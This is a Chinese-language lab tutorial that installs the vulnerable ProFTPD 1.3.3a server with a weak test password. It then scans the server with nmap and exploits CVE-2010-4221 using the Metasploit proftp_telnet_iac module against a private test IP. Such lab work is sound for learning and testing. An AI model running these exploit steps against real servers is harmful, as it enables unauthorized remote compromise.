# ProFTPD测试环境搭建与漏洞测试

## 0x00 ProFTPD简介
---

全称Professional FTP daemon，是一个Unix平台上或是类Unix平台上（如Linux, FreeBSD等）的FTP服务器程序

镜像下载地址：

ftp://ftp.proftpd.org/

## 0x01 测试系统配置：
---

新建一个ftp专有用户组ftpadmin：

```
groupadd ftpadmin 
```

指定ftpadmin组下用户ftpadmin1，对目录/var/ftp有权限：

```
useradd -d /var/ftp -g ftpadmin ftpadmin1
```

设置用户ftpadmin1密码：

```
passwd ftpadmin1
```

设置密码为`123456`

新建ftp文件目录：

```
mkdir /var/ftp 
```

配置权限：

将ftp目录的所属组改为ftpadmin：

```
chgrp ftpadmin /var/ftp 
```

设置目录权限：

```
chmod 2755 /var/ftp
```

## 0x02 安装ProFTPD
---

为了测试漏洞`CVE-2010-4221`，所以选择下载`proftpd-1.3.3a`

漏洞详情：

https://cvedetails.com/cve/CVE-2010-4221/

下载文件：

wget ftp://ftp.proftpd.org/historic/source/proftpd-1.3.3a.tar.bz2

解压缩：

```
tar -xjf proftpd-1.3.3a.tar.bz2
```

安装：

设置安装目录/var/proftpd, 配置文件目录/etc：

```
./configure --prefix=/var/proftpd --sysconfdir=/etc --enable-ctrls  
make & make install
```

修改proftpd配置文件：

```
vim /etc/proftpd.conf 
```

设置登录用户和用户组：

```
# Set the user and group under which the server will run.
User                            ftpadmin1
Group                           ftpadmin
```

启动服务：

```
/var/proftpd/sbin/proftpd 
```

结束服务：

```
pkill  proftpd
```

浏览器访问：

ftp://192.168.81.142/

输出用户名:`ftpadmin1`
密码：`123456`

登录成功

windows命令行：

```
ftp 192.168.81.142
```

kali 2.0：

默认不支持ftp命令，需要安装：

```
apt-get install ftp
```

## 0x03 漏洞测试
---

服务器版本探测：

```
nmap -sV 192.168.81.142
```

服务器系统探测：

```
nmap -O 192.168.81.142
```

msf搜索相关exp：

```
search CVE-2010-4221
```

找到可用payload：

- exploit/freebsd/ftp/proftp_telnet_iac
- exploit/linux/ftp/proftp_telnet_iac

查看详情：

```
use linux/ftp/proftp_telnet_iac 
info
```

漏洞利用：

```
set RHOST 192.168.81.142
exploit
```

